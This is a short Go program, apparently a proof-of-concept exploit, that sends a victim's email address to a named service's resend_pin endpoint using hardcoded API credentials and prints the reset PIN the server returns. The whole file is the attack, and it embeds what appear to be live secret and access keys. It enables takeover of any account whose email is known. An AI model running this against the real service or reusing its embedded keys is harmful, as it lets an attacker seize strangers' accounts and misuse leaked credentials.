package main

import (
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "net/url"
    "os"
    "time"
)

type resetPinResp struct {
    Pin string `json:"pin"`
}

func main() {
    resp, err := http.PostForm("https://rosa-backend.gti.tech/v1/resend_pin", url.Values{
        "secret_access_key": {"wL2GzLRFsfUV4yXyxH3Y"},
        "access_key_id":     {"CVBBctTC5S1DYbyE"},
        "email":             {os.Args[1]},
        "locale":            {"en-GB"},
        "type":              {"email"},
    })

    if err == nil {
        var a resetPinResp
        json.NewDecoder(resp.Body).Decode(&a)
        fmt.Println("Pin is", a.Pin)
    } else {
        log.Fatalln(err)
    }
}
